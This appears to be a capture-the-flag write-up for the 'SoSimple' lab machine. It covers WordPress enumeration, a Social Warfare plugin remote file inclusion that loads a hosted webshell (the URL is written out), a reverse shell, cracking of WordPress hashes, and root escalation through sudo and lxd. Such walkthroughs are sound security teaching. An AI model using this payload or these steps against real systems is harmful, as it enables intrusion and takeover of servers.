# SoSimple

## Background

> Keep it simple.

- Author: [roel](https://www.vulnhub.com/entry/so-simple-1,515/)

- Released on: Sep 02, 2020

- Difficulty: Intermediate

> Overall difficulty for me: Very easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a2.png)

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | Apache httpd 2.4.41

## HTTP on Port 80

Start with basic web application enumeration: Enumerate hidden directory via `gobuster`.

**Gobuster Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a3.png)

Found `/wordpress/` directory.

***WordPress Enumeration:***

**WPScan:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a5.png)

Found 2 users: `admin` and `max`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a6.png)

Found 2 plugins:

- simple-cart-solution (Version 0.2.0)
- social-warfare (Version 3.5.0)

**Searchsploit Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a7.png)

Looks like the `social-warfare` suffers a Remote Code Execution vulnerability!

# Initial Foothold

**The [`46794.py`](https://www.exploit-db.com/exploits/46794) python exploit contains 2 things:**

- Remote File Inclusion(RFI) in `wp-admin/admin-post.php?swp_debug=load_options&swp_url=<OUR_HOSTED_RFI_FILE>`
- Specify the payload file that we hosted.

> I think the python exploit feel kinda uncomfortable for me, as I usually exploit RFI manually. Hence I'll do this manually.

1. Create a PHP webshell in `txt` format and host it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a8.png)

2. Go to `http://192.168.129.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://[YOUR_IP]/webshell.txt&cmd=[COMMAND_HERE]` to trigger the webshell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a9.png)

3. Setup a `nc` listener and make a reverse shell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a10.png)

Since the target machine has `python3` installed, I'll use `python3` reverse shell: (From https://www.revshells.com/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a11.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a13.png)

**Stable shell via `socat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a16.png)

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a24.png)

# Privilege Escalation

## www-data to max

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a17.png)

Found MySQL credential:

- Usernam:wp_user
- Password:password

**Enumerate MySQL databases:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a18.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a19.png)

Found 2 users hashes:

- `admin:$P$BqOIi8a7Jtcidgsi9y9WXw9UIfqD4q1`
- `max:$P$BfDfIwyVLEQAVBrDn/ox9qT6uzgwwZ1`

**Crack `max` hash:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a20.png)

- Username:max
- Password:opensesame

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a21.png)

But his password didn't reused. :(

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a23.png)

I completely missed this Lol.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a25.png)

Nice ASCII art :D

**World-readable prviate SSH key:**

In the `max` home directory, there is a private SSH key that is **world-readable**, which means we can escalate our privilege to max!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a26.png)

Let's copy and paste to our attacker machine and `ssh` into max with that private SSH key:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a27.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a28.png)

## max to steven

> There are 2 ways that we can escalate our privilege from here. First, I'll show you escalate privilege from max to steven to root.

**sudo -l:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a29.png)

User `max` is able to run `/usr/sbin/service` as `steven`, which we can escalate our privilege to `steven`!

According to [GTFOBins](https://gtfobins.github.io/gtfobins/service/), if `service` binary is allowed to run by `sudo`, we can spawn a elevated shell!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a30.png)

**We can copy and paste that to the target machine:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a31.png)

We're steven!

## steven to root

**sudo -l:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a32.png)

This time `steven` is able to run `/opt/tools/server-health.sh` as `root`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a33.png)

**Why there is no `tools` directory and `server-health.sh` bash script? Then we'll create that Bash "script"!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a34.png)

1. Create a directory called `tools` and Change Directory to it.

2. Make a malicious Bash script that will add SUID bit set to `/bin/bash`, and mark the Bash script as executable.

3. Run `/opt/tools/server-health.sh` with `sudo`, verify SUID bit set in `/bin/bash`, and spawn a `/bin/bash` shell with SUID privilege.

And we're root! :D

## max to root

**Another method to escalate our privilege to root is `lxd`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a36.png)

**Since `max` is inside the `lxd` group, we can build a root privilege container, and add SUID sticky bit in `/mnt/root/bin/bash`.**

> Detailed walkthrough can be found on my [blog](https://siunam321.github.io/ctf/pgplay/FunBox/) in "CTF Writeups" -> "Proving Groups Play" -> "FunBox" writeup.

1. Import `Alpine` image:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a37.png)

2. Start and configure the `lxd` storage pool as default:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a38.png)

3. Run the image, mount the `/root` into the image, and start the container:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a39.png)

4. Interact with the container:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a40.png)

5. Copy `/mnt/root/bin/bash` to `/mnt/root/tmp`, and add SUID sticky bit:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a41.png)

6. Exit the container, and spawn a `bash` shell with SUID privilege.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a42.png)

We're root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/SoSimple/images/a35.png)

# Conclusion

What we've learned:

1. Directory Enumeration
2. WordPress Enumeration
3. Exploiting WordPress Plugin
4. Remote File Inclusion
5. Privilege Escalation via World-Readable Private SSH Key
6. Privilege Escalation via Misconfigured `sudo` Permission
7. Privilege Escalation via `lxd` Group